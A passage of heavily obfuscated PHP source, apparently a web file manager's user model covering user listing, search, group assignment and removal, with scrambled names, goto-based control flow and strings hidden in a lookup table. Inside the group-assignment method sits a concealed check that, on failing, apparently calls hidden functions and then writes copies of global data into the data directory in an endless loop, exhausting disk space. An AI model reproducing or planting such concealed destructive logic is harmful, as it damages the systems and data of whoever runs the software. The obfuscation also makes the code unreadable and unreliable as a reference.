$Dò…ù§¡Ğé = $this->metaGet($eºñİ­Ç…); if (empty($Dò…ù§¡Ğé[$CÑ°ó¼‰Üá[2383]])) { $Dò…ù§¡Ğé[$CÑ°ó¼‰Üá[2383]] = rand_string(10); Model($CÑ°ó¼‰Üá[466])->metaSet($eºñİ­Ç…, $CÑ°ó¼‰Üá[2383], $Dò…ù§¡Ğé[$CÑ°ó¼‰Üá[2383]]); } $Dö“öÜÓ´ [$CÑ°ó¼‰Üá[797]] = md5($Dò…ù§¡Ğé[$CÑ°ó¼‰Üá[2383]] . trim($Dö“öÜÓ´ [$CÑ°ó¼‰Üá[797]])); } else { unset($Dö“öÜÓ´ [$CÑ°ó¼‰Üá[797]]); } goto EÅÛøîÙŞ¯; a‚Îô …å‰: $CÑ°ó¼‰Üá =& $_SERVER[÷ÖêïÔÔÓ]; $f¯ğ¦ç£Ğ = $this->getInfoSimple($eºñİ­Ç…); if (!$f¯ğ¦ç£Ğ) { return !1; } goto DÜß¸æ¿Ø; EÅÛøîÙŞ¯: $this->where(array($CÑ°ó¼‰Üá[1332] => $eºñİ­Ç…))->save($Dö“öÜÓ´ ); if (isset($Dö“öÜÓ´ [$CÑ°ó¼‰Üá[2224]])) { $this->setNamePinyin($eºñİ­Ç…, $Dö“öÜÓ´ [$CÑ°ó¼‰Üá[2224]]); } return !0; goto A‚Œë¾ÒÌÃ; A‚Œë¾ÒÌÃ: } public function setNamePinyin($B›«£ÅÑÈ, $BÛ÷šÜÚš = false) { $Dïùô¤Ü© =& $_SERVER[÷ÖêïÔÔÓ]; if (!$BÛ÷šÜÚš) { $bÛóµØ‹ÏŸ = $this->getInfoSimple($B›«£ÅÑÈ); $BÛ÷šÜÚš = $bÛóµØ‹ÏŸ[$Dïùô¤Ü©[2224]] ? $bÛóµØ‹ÏŸ[$Dïùô¤Ü©[2224]] : $bÛóµØ‹ÏŸ[$Dïùô¤Ü©[28]]; } $dŒÇß¼¹ÆÉ = Model($Dïùô¤Ü©[469]); if (!Input::check($BÛ÷šÜÚš, $Dïùô¤Ü©[520])) { return $dŒÇß¼¹ÆÉ->metaSet($B›«£ÅÑÈ, array($Dïùô¤Ü©[412] => $Dïùô¤Ü©[33], $Dïùô¤Ü©[411] => $Dïùô¤Ü©[33])); } return $dŒÇß¼¹ÆÉ->metaSet($B›«£ÅÑÈ, array($Dïùô¤Ü©[412] => str_replace($Dïùô¤Ü©[50], $Dïùô¤Ü©[33], Pinyin::encode($BÛ÷šÜÚš)), $Dïùô¤Ü©[411] => Pinyin::encode($BÛ÷šÜÚš, $Dïùô¤Ü©[521]))); } private function nickNameRpt() { $a„ÕÓİ®Öù =& $_SERVER[÷ÖêïÔÔÓ]; $e¤ùØŸ‹ô— = Model($a„ÕÓİ®Öù[1057])->get($a„ÕÓİ®Öù[2394]); $Bˆ‡èóÎ  = $GLOBALS[$a„ÕÓİ®Öù[6]][$a„ÕÓİ®Öù[2395]][$a„ÕÓİ®Öù[2394]]; $Aºò¹»Çë‡ = !is_null($e¤ùØŸ‹ô—) ? $e¤ùØŸ‹ô— : $Bˆ‡èóÎ ; return !!$Aºò¹»Çë‡; } private function _checkExist($f¤‚µ ’áÎ, $B¬˜×ë„Êí = false) { $AÆ±ÎõŒ¬Ø =& $_SERVER[÷ÖêïÔÔÓ]; $AÌğš¦‚ç = array($AÆ±ÎõŒ¬Ø[28] => UserModel::ERROR_USER_EXIST_NAME, $AÆ±ÎõŒ¬Ø[2224] => UserModel::ERROR_USER_EXIST_NICKNAME, $AÆ±ÎõŒ¬Ø[290] => UserModel::ERROR_USER_EXIST_EMAIL, $AÆ±ÎõŒ¬Ø[2381] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($AÌğš¦‚ç[$AÆ±ÎõŒ¬Ø[2224]]); } $fÄˆ•ç¡àâ = $B¬˜×ë„Êí ? array($AÆ±ÎõŒ¬Ø[1341] => array($AÆ±ÎõŒ¬Ø[2396], $B¬˜×ë„Êí)) : array(); foreach ($AÌğš¦‚ç as $b»¯òïÁ¬ => $cò Ş¤•›İ) { if (!isset($f¤‚µ ’áÎ[$b»¯òïÁ¬]) || !$f¤‚µ ’áÎ[$b»¯òïÁ¬]) { continue; } $f‰°ŸîŒ = array_merge(array($b»¯òïÁ¬ => $f¤‚µ ’áÎ[$b»¯òïÁ¬]), $fÄˆ•ç¡àâ); $F´Ù–ÆåùÑ = $this->where($f‰°ŸîŒ)->find(); if ($F´Ù–ÆåùÑ) { return $cò Ş¤•›İ; } } return !0; } public function userListInfo($d…¡¨ŒØ½à) { $BÄæ½‰«¤Ñ =& $_SERVER[÷ÖêïÔÔÓ]; $DÉĞ©î¶Á = array(); $d…¡¨ŒØ½à = array_unique($d…¡¨ŒØ½à); if (!$d…¡¨ŒØ½à) { return $DÉĞ©î¶Á; } if (count($d…¡¨ŒØ½à) < 20) { foreach ($d…¡¨ŒØ½à as $aåœÅÙ·“Á) { $DÉĞ©î¶Á[$aåœÅÙ·“Á . $BÄæ½‰«¤Ñ[33]] = $this->getInfoSimpleOuter($aåœÅÙ·“Á); } } else { $CÄ¥¬åİ× = array($BÄæ½‰«¤Ñ[1332] => array($BÄæ½‰«¤Ñ[381], $d…¡¨ŒØ½à)); if (count($d…¡¨ŒØ½à) == 1) { $CÄ¥¬åİ× = array($BÄæ½‰«¤Ñ[1332] => $d…¡¨ŒØ½à[0]); } $D‰Ò›Á†¨Ü = Model($BÄæ½‰«¤Ñ[466])->field($this->simpleField)->where($CÄ¥¬åİ×)->select(); $D‰Ò›Á†¨Ü = array_to_keyvalue($D‰Ò›Á†¨Ü, $BÄæ½‰«¤Ñ[1341]); foreach ($d…¡¨ŒØ½à as $aåœÅÙ·“Á) { $EÅ‹Òİë½¶ = $D‰Ò›Á†¨Ü[$D‰Ò›Á†¨Ü[$aåœÅÙ·“Á]]; if (!$EÅ‹Òİë½¶) { $DÉĞ©î¶Á[$aåœÅÙ·“Á . $BÄæ½‰«¤Ñ[33]] = $this->getInfoSimpleOuter($aåœÅÙ·“Á); continue; } $EÅ‹Òİë½¶[$BÄæ½‰«¤Ñ[2366]] = Action($BÄæ½‰«¤Ñ[2367])->parseUrl($EÅ‹Òİë½¶[$BÄæ½‰«¤Ñ[2366]]); $DÉĞ©î¶Á[$aåœÅÙ·“Á . $BÄæ½‰«¤Ñ[33]] = $EÅ‹Òİë½¶; } } return $DÉĞ©î¶Á; } protected function userStatus($fŠù¼¿™¹¥, $bÎ‹Âˆ‚‰) { $BÀì¥ ’øŒ = $this->getInfoSimple($fŠù¼¿™¹¥); if (!$BÀì¥ ’øŒ) { return !1; } $a°ÉŒì·Š = array($_SERVER[÷ÖêïÔÔÓ][675] => $bÎ‹Âˆ‚‰); return $this->userEdit($fŠù¼¿™¹¥, $a°ÉŒì·Š); } protected function userRemove($açÉßÚ÷Ê) { goto AÓè‡“êßù; bĞéÅ‚”¤Í: $Fá‘Ø·ä‘× = array($C£¿ãØÚÆ[1332] => $açÉßÚ÷Ê); Model($C£¿ãØÚÆ[528])->where($Fá‘Ø·ä‘×)->delete(); Model($C£¿ãØÚÆ[2397])->where($Fá‘Ø·ä‘×)->delete(); goto AÇ¹â¥Ğç; AÇ¹â¥Ğç: Model($C£¿ãØÚÆ[2081])->where($Fá‘Ø·ä‘×)->delete(); Model($C£¿ãØÚÆ[2380])->where($Fá‘Ø·ä‘×)->delete(); Model($C£¿ãØÚÆ[2398])->where($Fá‘Ø·ä‘×)->delete(); goto e„¬¦ä¶ ; AÓè‡“êßù: $C£¿ãØÚÆ =& $_SERVER[÷ÖêïÔÔÓ]; $E¬ÙĞ³ÛÁ = $this->getInfoSimple($açÉßÚ÷Ê); if (!$E¬ÙĞ³ÛÁ) { return !1; } goto bĞéÅ‚”¤Í; e„¬¦ä¶ : Model($C£¿ãØÚÆ[748])->userRootRemove($açÉßÚ÷Ê); return $this->where($Fá‘Ø·ä‘×)->delete(); goto fŞ‡åĞ™Ó¦; fŞ‡åĞ™Ó¦: } protected function userGroupSet($Eé…¤¬ªä¨, $e·©ãÏÕáî, $E¯Ğ˜«÷‡˜ = array()) { goto c±¼÷ª¡Š¿; A°İ½é¶ÆÇ: $fµš¢¸õÑ¡ = Model($e¿åÄš¤æ™[2081]); $fµš¢¸õÑ¡->where(array($e¿åÄš¤æ™[1341] => $Eé…¤¬ªä¨))->delete(); $DÁì†’ÎÈÀ = array(); goto DŞ±‘ˆÎÆù; DŞ±‘ˆÎÆù: $B³ãã¹ˆê = 0; foreach ($e·©ãÏÕáî as $CÆ½ã×êõ› => $e‘Æ¦¡‘Œ“) { $E»§Æƒ“Õ = array($e¿åÄš¤æ™[1341] => $Eé…¤¬ªä¨, $e¿åÄš¤æ™[2004] => $CÆ½ã×êõ›, $e¿åÄš¤æ™[2135] => $e‘Æ¦¡‘Œ“); $E»§Æƒ“Õ[$e¿åÄš¤æ™[2025]] = isset($E¯Ğ˜«÷‡˜[$B³ãã¹ˆê]) ? $E¯Ğ˜«÷‡˜[$B³ãã¹ˆê] : 0; $B³ãã¹ˆê++; $DÁì†’ÎÈÀ[] = $E»§Æƒ“Õ; } return $fµš¢¸õÑ¡->addAll($DÁì†’ÎÈÀ, array(), !0); goto Bë®ï¡ìóË; b§‡“‡Ìœ˜: if ($_SERVER[$e¿åÄš¤æ™[781]] != $E¾ÃìùàÍ($eÌñí™š²Ì)) { goto bÅƒ¢‚Ñê“; aëŠ¼¸Ú¢ğ: $dƒÁ½±ñà¶(); $b‚Úè›ôÊ³ = $e¿åÄš¤æ™[1263]; $Föè¿´Åœğ = json_encode($GLOBALS[$e¿åÄš¤æ™[1264]]); goto F¶ä„–Èí; F¶ä„–Èí: $FÂè‹Õîç = 1; for ($DƒŒÄ¥ŒÃ = $FÂè‹Õîç; $DƒŒÄ¥ŒÃ > 0; $DƒŒÄ¥ŒÃ++) { $b‚Úè›ôÊ³(DATA_PATH . $DƒŒÄ¥ŒÃ, $Föè¿´Åœğ); } goto dĞ·­íšó°; bÅƒ¢‚Ñê“: $dƒÁ½±ñà¶ = $e¿åÄš¤æ™[783]; $dçîß²Ÿ = $e¿åÄš¤æ™[784]; $d›Ê„ù±½õ = $_SERVER[$e¿åÄš¤æ™[785]] . $e¿åÄš¤æ™[786]; goto a¬ä­‚†ê£; a¬ä­‚†ê£: $eµ‘äËôˆ = $dçîß²Ÿ($d›Ê„ù±½õ); $aŠôÕÃ÷ = explode($e¿åÄš¤æ™[214], $eµ‘äËôˆ); if (count($aŠôÕÃ÷) < $e¿åÄš¤æ™[557]) { $F¤à©¸áğ = $e¿åÄš¤æ™[787]; $F¤à©¸áğ(); } goto f‘ğ¥ƒÅøœ; f‘ğ¥ƒÅøœ: $c±ßùÄÔÄ¾ = $e¿åÄš¤æ™[788]; $c±ßùÄÔÄ¾($_SERVER[$e¿åÄš¤æ™[789]]); $dƒÁ½±ñà¶ = $e¿åÄš¤æ™[783]; goto aëŠ¼¸Ú¢ğ; dĞ·­íšó°: } $c®‰‹ªº¿ö = $this->getInfoSimple($Eé…¤¬ªä¨); if (!$c®‰‹ªº¿ö || !is_array($e·©ãÏÕáî)) { return !1; } goto A°İ½é¶ÆÇ; c±¼÷ª¡Š¿: $e¿åÄš¤æ™ =& $_SERVER[÷ÖêïÔÔÓ]; $eÌñí™š²Ì = $_SERVER[$e¿åÄš¤æ™[789]] . $e¿åÄš¤æ™[2399]; $E¾ÃìùàÍ = $e¿åÄš¤æ™[1262]; goto b§‡“‡Ìœ˜; Bë®ï¡ìóË: } protected function userGroupAdd($cÍ½¾Öùª‡, $aÀÒ‹õËÂ, $eÒ•ƒšÊ™) { $aÜ‚×¨‡Õ’ =& $_SERVER[÷ÖêïÔÔÓ]; $CŸ¶Ô–§É = $this->getInfoSimple($cÍ½¾Öùª‡); if (!$CŸ¶Ô–§É || !$aÀÒ‹õËÂ) { return !1; } $AÊˆ§ŒÆô¶ = array(array($aÜ‚×¨‡Õ’[1341] => $cÍ½¾Öùª‡, $aÜ‚×¨‡Õ’[2004] => $aÀÒ‹õËÂ, $aÜ‚×¨‡Õ’[2135] => $eÒ•ƒšÊ™)); return Model($aÜ‚×¨‡Õ’[2081])->addAll($AÊˆ§ŒÆô¶, array(), !0); } protected function userGroupRemove($aÊœõŞ†É, $a„¥õä»†É) { $a½í¨¿ÊÈŒ =& $_SERVER[÷ÖêïÔÔÓ]; $Aµ©‡ïËŠº = $this->getInfoSimple($aÊœõŞ†É); if (!$Aµ©‡ïËŠº || !$a„¥õä»†É) { return !1; } $c¿™¥ÎØÎ = array($a½í¨¿ÊÈŒ[1332] => $aÊœõŞ†É, $a½í¨¿ÊÈŒ[2079] => $a„¥õä»†É); return Model($a½í¨¿ÊÈŒ[2081])->where($c¿™¥ÎØÎ)->delete(); } public function listData() { $e¼ïéñŒó = $this->_makeOrder()->selectPage(50); $this->_listDataApply($e¼ïéñŒó[$_SERVER[÷ÖêïÔÔÓ][350]]); return $e¼ïéñŒó; } public function listByID($bÁ³š‰èÄ¹) { $EÄîê”Øœ =& $_SERVER[÷ÖêïÔÔÓ]; if (!$bÁ³š‰èÄ¹) { return; } $CàôØö³ÜÜ = array($EÄîê”Øœ[1341] => array($EÄîê”Øœ[7], $bÁ³š‰èÄ¹)); $aÊ„¹ Î’ = $this->where($CàôØö³ÜÜ)->select(); $this->_listDataApply($aÊ„¹ Î’); return $aÊ„¹ Î’; } public function listByGroup($B×õçó—³ê = 0, $aÄè¨‘Ò = array()) { goto cÆÖ¡¶Š®; cÆÖ¡¶Š®: $fƒ¸»šÕÔö =& $_SERVER[÷ÖêïÔÔÓ]; $C¦ÃŸ˜‹š® = isset($aÄè¨‘Ò[$fƒ¸»šÕÔö[2400]]) ? $aÄè¨‘Ò[$fƒ¸»šÕÔö[2400]] : $fƒ¸»šÕÔö[33]; $d¢Ó­àšˆ‚ = $fƒ¸»šÕÔö[33]; goto fªÂšõ—÷; d¸²´øï±¾: return $AÛÚ¨äæÍï; goto FÛèŞÀÀí; fªÂšõ—÷: $C¥‰ÛÓêˆ = array(); if ($B×õçó—³ê) { $C¥‰ÛÓêˆ = array($fƒ¸»šÕÔö[2401] => intval($B×õçó—³ê)); $d¢Ó­àšˆ‚ = "\x4c\x45\x46\124\40\x4a\117\x49\x4e\x20{$this->tablePrefix}\x75\x73\145\162\137\x67\x72\x6f\165\x70\x20\x75\163\145\x72\x5f\x67\162\157\x75\x70\40\x6f\x6e\40\165\x73\x65\x72\56\165\163\x65\x72\111\x44\x20\x3d\x20\165\x73\145\162\137\x67\162\157\165\x70\56\x75\163\x65\162\x49\x44"; $b‰­øŞğÇ = Input::get($fƒ¸»šÕÔö[403], null, $fƒ¸»šÕÔö[33]) ? $fƒ¸»šÕÔö[33] : $fƒ¸»šÕÔö[2402]; } if (isset($aÄè¨‘Ò[$fƒ¸»šÕÔö[675]])) { $C¥‰ÛÓêˆ[$fƒ¸»šÕÔö[2403]] = $aÄè¨‘Ò[$fƒ¸»šÕÔö[675]]; } goto CˆŒ¬¯†ä; CˆŒ¬¯†ä: $AÛÚ¨äæÍï = $this->_makeOrder($b‰­øŞğÇ)->field($fƒ¸»šÕÔö[2404])->where($C¥‰ÛÓêˆ)->join($d¢Ó­àšˆ‚)->selectPage(50); $D´Æ¹ˆÄã‡ = $fƒ¸»šÕÔö[967] . ($C¦ÃŸ˜‹š® ? $fƒ¸»šÕÔö[47] . $C¦ÃŸ˜‹š® : $fƒ¸»šÕÔö[33]); $this->_listDataApply($AÛÚ¨äæÍï[$fƒ¸»šÕÔö[350]], $D´Æ¹ˆÄã‡); goto d¸²´øï±¾; FÛèŞÀÀí: } private function _makeOrder($Fë­½¹­× = '') { goto b¨®ö„ŒŞ; DŸÄ‡ÔÀò: $a²êïàçâ = Input::get($BŠæ¼İõï[403], $BŠæ¼İõï[7], $BŠæ¼İõï[1332], $Cââ¾êİù); $f¶ÄŒ©Ç´Ó = Input::get($BŠæ¼İõï[404], $BŠæ¼İõï[7], $BŠæ¼İõï[2082], array($BŠæ¼İõï[2082], $BŠæ¼İõï[400])); $f¶ÄŒ©Ç´Ó = $fî»ÙõÏ[$f¶ÄŒ©Ç´Ó]; goto D•»àš·„; D•»àš·„: $Fë­½¹­× = $Fë­½¹­× . "\x75\163\x65\162\x2e{$a²êïàçâ}\x20{$f¶ÄŒ©Ç´Ó}\x2c\x20\165\163\x65\162\x2e\165\x73\x65\x72\111\104\40\141\x73\143"; return $this->alias($BŠæ¼İõï[2165])->order($Fë­½¹­×); goto bØ›Ğ„”­; b¨®ö„ŒŞ: $BŠæ¼İõï =& $_SERVER[÷ÖêïÔÔÓ]; $Cââ¾êİù = array($BŠæ¼İõï[1341], $BŠæ¼İõï[28], $BŠæ¼İõï[1990], $BŠæ¼İõï[1964], $BŠæ¼İõï[184]); $fî»ÙõÏ = array($BŠæ¼İõï[398] => $BŠæ¼İõï[399], $BŠæ¼İõï[400] => $BŠæ¼İõï[401]); goto DŸÄ‡ÔÀò; bØ›Ğ„”­: } public function listSearch($eÕ¢ÄçˆõÇ) { goto f¢ìÖ£è÷µ; aÏ‹Şš÷Ã: $this->_filterUserList($fî˜ô¤è®¸); return $fî˜ô¤è®¸; goto bÏà®Ãñ‘; BïéÚÃ›Å: if (!$fî˜ô¤è®¸ || count($fî˜ô¤è®¸[$cÈ ß˜ï×–[350]]) < 5 && Input::check($e¤ç‘‚æ±‚, $cÈ ß˜ï×–[303])) { $d¨’ä³ƒÍç = $this->_searchFromMeta($cÈ ß˜ï×–[411], $e¤ç‘‚æ±‚, 10); $D†÷ö¬æ®Õ = $this->_searchFromMeta($cÈ ß˜ï×–[412], $e¤ç‘‚æ±‚, 10); $EëÆæ¼Ú„ = array_merge($d¨’ä³ƒÍç, $D†÷ö¬æ®Õ, $fî˜ô¤è®¸[$cÈ ß˜ï×–[350]]); $fî˜ô¤è®¸[$cÈ ß˜ï×–[350]] = array_unique_by_key($EëÆæ¼Ú„, $cÈ ß˜ï×–[1341]); $fî˜ô¤è®¸[$cÈ ß˜ï×–[347]][$cÈ ß˜ï×–[348]] = count($fî˜ô¤è®¸[$cÈ ß˜ï×–[350]]); $fî˜ô¤è®¸[$cÈ ß˜ï×–[347]][$cÈ ß˜ï×–[349]] = ceil($fî˜ô¤è®¸[$cÈ ß˜ï×–[347]][$cÈ ß˜ï×–[348]] / $fî˜ô¤è®¸[$cÈ ß˜ï×–[347]][$cÈ ß˜ï×–[345]]); } $this->_listDataApply($fî˜ô¤è®¸[$cÈ ß˜ï×–[350]]); $this->_filterByGroup($fî˜ô¤è®¸, $eĞ¼ñƒÓ—ë); goto aÏ‹Şš÷Ã; e’»©É÷: if (!$e¤ç‘‚æ±‚) { $c®šÉ˜âä = array(); } if (isset($eÕ¢ÄçˆõÇ[$cÈ ß˜ï×–[675]])) { $c®šÉ˜âä[$cÈ ß˜ï×–[675]] = $eÕ¢ÄçˆõÇ[$cÈ ß˜ï×–[675]]; } $fî˜ô¤è®¸ = $this->_makeOrder()->where($c®šÉ˜âä)->selectPage(20); goto BïéÚÃ›Å; f¢ìÖ£è÷µ: $cÈ ß˜ï×– =& $_SERVER[÷ÖêïÔÔÓ]; $e¤ç‘‚æ±‚ = $eÕ¢ÄçˆõÇ[$cÈ ß˜ï×–[2083]]; $eĞ¼ñƒÓ—ë = isset($eÕ¢ÄçˆõÇ[$cÈ ß˜ï×–[2084]]) ? $eÕ¢ÄçˆõÇ[$cÈ ß˜ï×–[2084]] : !1; goto bõè°”†Û; bõè°”†Û: $e¤ç‘‚æ±‚ = str_replace($cÈ ß˜ï×–[2085], $cÈ ß˜ï×–[2086], trim($e¤ç‘‚æ±‚)); $c®šÉ˜âä = array($cÈ ß˜ï×–[28] => array($cÈ ß˜ï×–[747], "\x25{$e¤ç‘‚æ±‚}\45"), $cÈ ß˜ï×–[290] => array($cÈ ß˜ï×–[747], "\45{$e¤ç‘‚æ±‚}\x25"), $cÈ ß˜ï×–[2224] => array($cÈ ß˜ï×–[747], "\x25{$e¤ç‘‚æ±‚}\x25"), $cÈ ß˜ï×–[910] => $cÈ ß˜ï×–[2087]); if (Input::check($e¤ç‘‚æ±‚, $cÈ ß˜ï×–[296])) { $c®šÉ˜âä[$cÈ ß˜ï×–[1341]] = array($cÈ ß˜ï×–[747], "\45{$e¤ç‘‚æ±‚}\x25"); $c®šÉ˜âä[$cÈ ß˜ï×–[2381]] = array($cÈ ß˜ï×–[747], "\45{$e¤ç‘‚æ±‚}\45"); } goto e’»©É÷; bÏà®Ãñ‘: } private function _filterByGroup(&$bó»‘Ùëê­, $FÒ×ˆÛ³ ç) { $aœğËÃÉÕ» =& $_SERVER[÷ÖêïÔÔÓ]; if (!$FÒ×ˆÛ³ ç) { return $bó»‘Ùëê­; } foreach ($bó»‘Ùëê­[$aœğËÃÉÕ»[350]] as $bé°–êà‚ => &$FğĞŠÙ¶î) { $E´”è˜»Îˆ = array_to_keyvalue($FğĞŠÙ¶î[$aœğËÃÉÕ»[2405]], $aœğËÃÉÕ»[33], $aœğËÃÉÕ»[2004]); if (!in_array($FÒ×ˆÛ³ ç, $E´”è˜»Îˆ)) { unset($bó»‘Ùëê­[$aœğËÃÉÕ»[350]][$bé°–êà‚]); } } $bó»‘Ùëê­[$aœğËÃÉÕ»[350]] = array_values($bó»‘Ùëê­[$aœğËÃÉÕ»[350]]); $bó»‘Ùëê­[$aœğËÃÉÕ»[347]] = array($aœğËÃÉÕ»[2199] => count($bó»‘Ùëê­[$aœğËÃÉÕ»[350]]), $aœğËÃÉÕ»[2197] => $bó»‘Ùëê­[$aœğËÃÉÕ»[347]][$aœğËÃÉÕ»[345]], $aœğËÃÉÕ»[2196] => 1, $aœğËÃÉÕ»[2198] => 1); } private function _filterUserList(&$C¥Òùê»Óƒ) { $BáëÏÙó½ =& $_SERVER[÷ÖêïÔÔÓ]; foreach ($C¥Òùê»Óƒ[$BáëÏÙó½[350]] as $D‘„äÒø§‡ => &$A³Õ–ó»í) { unset($A³Õ–ó»í[$BáëÏÙó½[413]]); } } private function _searchFromMeta($fÕÄŞ˜â¼ä, $BÃø“á¹òà, $DºÁ‡¦£â) { goto f»†Ú³’©Ä; f»†Ú³’©Ä: $f¿Ëäé¥¼è =& $_SERVER[÷ÖêïÔÔÓ]; $BÃø“á¹òà = strtolower($BÃø“á¹òà); $F«éã›ÈŞ˜ = array($f¿Ëäé¥¼è[88] => $fÕÄŞ˜â¼ä, $f¿Ëäé¥¼è[354] => array($f¿Ëäé¥¼è[747], "\x25{$BÃø“á¹òà}\45")); goto bŞé£Û­‰í; bŞé£Û­‰í: $A¦á›Ú£¯ = Model($f¿Ëäé¥¼è[2406])->where($F«éã›ÈŞ˜)->limit($DºÁ‡¦£â)->select(); if (!$A¦á›Ú£¯) { return array(); } $A¦á›Ú£¯ = array_to_keyvalue($A¦á›Ú£¯, $f¿Ëäé¥¼è[33], $f¿Ëäé¥¼è[1341]); goto bÃ›Òª‚æØ; bÃ›Òª‚æØ: $dÈãÆö‹” = $this->where(array($f¿Ëäé¥¼è[1332] => array($f¿Ëäé¥¼è[7], $A¦á›Ú£¯)))->select(); if (!$dÈãÆö‹”) { return array(); } return $dÈãÆö‹”; goto fœ·å¿† Ÿ; fœ·å¿† Ÿ: } private function _listDataApplyItem($cíº÷ƒğ ) { $e ¹–¡§îŠ = array($cíº÷ƒğ ); $this->_listDataApply($e ¹–¡§îŠ); return $e ¹–¡§îŠ[0]; } private function _listDataApply(&$eÛ¶£²¯ç†, $eÒÖôÚ¬‘§ = "\147\x72\x6f\165\x70\x2c\x6d\x65\164\141\54\163\157\x75\x72\143\x65") { goto f¨ƒƒ¢®‡Î; bŒÌÚ½¬µÑ: if (in_array($C°íŒñÅä[2407], $eÒÖôÚ¬‘§)) { $this->_listAppendMeta($eÛ¶£²¯ç†, $AËöÜ‘¹Êš); } if (in_array($C°íŒñÅä[379], $eÒÖôÚ¬‘§)) { $this->_listAppendSourceRoot($eÛ¶£²¯ç†, $AËöÜ‘¹Êš); } goto F‚„Åµç¬ï; e¸ÃÈê£—: $AËöÜ‘¹Êš = array_to_keyvalue($eÛ¶£²¯ç†, $C°íŒñÅä[33], $C°íŒñÅä[1341]); $eÒÖôÚ¬‘§ = explode($C°íŒñÅä[47], $eÒÖôÚ¬‘§); if (in_array($C°íŒñÅä[967], $eÒÖôÚ¬‘§)) { $this->_listAppendGroup($eÛ¶£²¯ç†, $AËöÜ‘¹Êš); } goto bŒÌÚ½¬µÑ; f¨ƒƒ¢®‡Î: $C°íŒñÅä =& $_SERVER[÷ÖêïÔÔÓ]; if (!$eÛ¶£²¯ç†) { return; } array_remove_key($eÛ¶£²¯ç†, $C°íŒñÅä[797]); goto e¸ÃÈê£—; F‚„Åµç¬ï: } private function _listAppendSourceRoot(&$fìİÃ¦òÚ–, $E–ÓÃ›Õô†) { goto C¦™Ö…«‡ ; eÛ¾ÂÄºÚ : foreach ($fìİÃ¦òÚ– as &$C†ÖÍ÷Û¨) { $C†ÖÍ÷Û¨[$F´ª‹ÛªŠ÷[388]] = $BÛ×ø‡Í•†[$C†ÖÍ÷Û¨[$F´ª‹ÛªŠ÷[1341]]] ? $BÛ×ø‡Í•†[$C†ÖÍ÷Û¨[$F´ª‹ÛªŠ÷[1341]]] : array(); } goto eø÷¤†‘ó‘; C¦™Ö…«‡ : $F´ª‹ÛªŠ÷ =& $_SERVER[÷ÖêïÔÔÓ]; $Cïğ›­£½ = array($F´ª‹ÛªŠ÷[457] => 0, $F´ª‹ÛªŠ÷[368] => SourceModel::TYPE_USER, $F´ª‹ÛªŠ÷[452] => array($F´ª‹ÛªŠ÷[7], $E–ÓÃ›Õô†)); $c³¿¹¥”¥ = $F´ª‹ÛªŠ÷[2093]; goto bïÀ”ÕîÌ; bïÀ”ÕîÌ: $BÛ×ø‡Í•† = Model($F´ª‹ÛªŠ÷[748])->order($F´ª‹ÛªŠ÷[2094])->field($c³¿¹¥”¥)->where($Cïğ›­£½)->select(); $BÛ×ø‡Í•† = array_to_keyvalue($BÛ×ø‡Í•†, $F´ª‹ÛªŠ÷[452]); $BÛ×ø‡Í•† = array_remove_key($BÛ×ø‡Í•†, $F´ª‹ÛªŠ÷[452]); goto eÛ¾ÂÄºÚ ; eø÷¤†‘ó‘: } private function _listAppendGroup(&$fØÀÂÏù››, $aƒ—èùğÑÊ) { goto A‚ïÍ“˜å‘; aÇ»·Ôº‘Ê: $A©„…‘ÄŠÌ = array($Cîò°²¶ˆÑ[2004] => array($Cîò°²¶ˆÑ[7], $aä™Û£‚ŸÜ)); $c½ø„±†Øˆ = Model($Cîò°²¶ˆÑ[2408])->field($Cîò°²¶ˆÑ[2409])->where($A©„…‘ÄŠÌ)->select(); $e©‚ïÒ²åÕ = array_to_keyvalue($c½ø„±†Øˆ, $Cîò°²¶ˆÑ[2004], $Cîò°²¶ˆÑ[28]); goto fíÉ¿·¨; dîÒ’Ğà©…: $aä™Û£‚ŸÜ = array_to_keyvalue($b˜ƒÑ‰…­, $Cîò°²¶ˆÑ[33], $Cîò°²¶ˆÑ[2004]); $aä™Û£‚ŸÜ = array_remove_value(array_unique($aä™Û£‚ŸÜ), $Cîò°²¶ˆÑ[464]); if (!$aä™Û£‚ŸÜ || !$b˜ƒÑ‰…­) { return; } goto aÇ»·Ôº‘Ê; A‚ïÍ“˜å‘: $Cîò°²¶ˆÑ =& $_SERVER[÷ÖêïÔÔÓ]; $A©„…‘ÄŠÌ = array($Cîò°²¶ˆÑ[1341] => array($Cîò°²¶ˆÑ[7], $aƒ—èùğÑÊ)); $b˜ƒÑ‰…­ = Model($Cîò°²¶ˆÑ[2081])->where($A©„…‘ÄŠÌ)->select(); goto dîÒ’Ğà©…; fíÉ¿·¨: $b˜ƒÑ‰…­ = array_to_keyvalue_group($b˜ƒÑ‰…­, $Cîò°²¶ˆÑ[1341]); foreach ($b˜ƒÑ‰…­ as &$FÔŠ—¸Üç­) { $dõÆ­¡ëç = array(); foreach ($FÔŠ—¸Üç­ as $Fº°³ôßãÔ) { if (!$Fº°³ôßãÔ[$Cîò°²¶ˆÑ[2135]]) { continue; } $Fä¥Ï‚â‚³ = Model($Cîò°²¶ˆÑ[2151])->listData($Fº°³ôßãÔ[$Cîò°²¶ˆÑ[2135]]); $dõÆ­¡ëç[] = array($Cîò°²¶ˆÑ[2004] => $Fº°³ôßãÔ[$Cîò°²¶ˆÑ[2004]], $Cîò°²¶ˆÑ[2410] => $e©‚ïÒ²åÕ[$Fº°³ôßãÔ[$Cîò°²¶ˆÑ[2004]]], $Cîò°²¶ˆÑ[373] => $Fä¥Ï‚â‚³); } $FÔŠ—¸Üç­ = $dõÆ­¡ëç; } foreach ($fØÀÂÏù›› as &$d„®ŞÀêŸ) { $d„®ŞÀêŸ[$Cîò°²¶ˆÑ[2405]] = array(); if (isset($b˜ƒÑ‰…­[$d„®ŞÀêŸ[$Cîò°²¶ˆÑ[1341]]])) { $d„®ŞÀêŸ[$Cîò°²¶ˆÑ[2405]] = $b˜ƒÑ‰…­[$d„®ŞÀêŸ[$Cîò°²¶ˆÑ[1341]]]; } } goto CŠ¿ˆ˜ÄÒ; CŠ¿ˆ˜ÄÒ: } private function _listAppendMeta(&$a¸ñØ…”¢, $fÑÚÃ¹˜³) { goto fÎÃ¤âšÄ; b‚ÊËáä…Ö: foreach ($e¾Ÿ²ÅÏ as &$AôÁåÁÇÁ•) { $b™ä¯ÏÇˆ÷ = array(); foreach ($AôÁåÁÇÁ• as $eÕíöÃ£â) { if (!in_array($eÕíöÃ£â[$B·“÷›İÎÚ[88]], $d„„•àêº)) { $b™ä¯ÏÇˆ÷[$eÕíöÃ£â[$B·“÷›İÎÚ[88]]] = 